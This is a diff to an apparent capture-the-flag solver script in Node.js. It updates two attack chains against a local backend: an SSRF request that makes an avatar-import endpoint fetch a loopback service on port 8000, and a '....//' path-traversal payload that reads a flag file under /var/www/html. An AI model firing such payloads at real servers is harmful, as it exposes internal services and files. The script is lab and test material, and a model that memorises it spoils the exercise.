@@ -10,7 +10,7 @@
  *
  * Env:
  *   BASE_URL       public backend base URL       (default http://localhost:4000)
- *   INTERNAL_PORT  loopback port of the private   (default 9099)
+ *   INTERNAL_PORT  loopback port of the private   (default 8000)
  *                  microservice, as seen by the
  *                  backend host (this is the SSRF target)
  *
@@ -23,7 +23,7 @@ const fs = require('fs');
 const path = require('path');
 
 const BASE = (process.env.BASE_URL || 'http://localhost:4000').replace(/\/$/, '');
-const INTERNAL_PORT = Number(process.env.INTERNAL_PORT) || 9099;
+const INTERNAL_PORT = Number(process.env.INTERNAL_PORT) || 8000;
 
 let expected = null;
 try {
@@ -81,7 +81,8 @@ async function main() {
 
   // ── Chain 2: SSRF → read the private microservice ─────────────────────────
   try {
-    const internalUrl = `http://127.0.0.1:${INTERNAL_PORT}/internal/v1/service/identity`;
+    // default SSRF payload: loopback + the common 8000 port, served at the root
+    const internalUrl = `http://127.0.0.1:${INTERNAL_PORT}/`;
     const r = await fetch(`${BASE}/api/profile/avatar-import`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', ...auth },
@@ -97,7 +98,7 @@ async function main() {
 
   // ── Chain 3: LFI via the double-strip bypass ──────────────────────────────
   try {
-    const payload = '....//....//flag_lfi.txt';
+    const payload = '....//....//....//....//var/www/html/flag_lfi.txt';
     const r = await fetch(`${BASE}/api/levels/asset?name=${encodeURIComponent(payload)}`);
     const text = await r.text();
     const v = check(extractFlag(text), 'lfi');
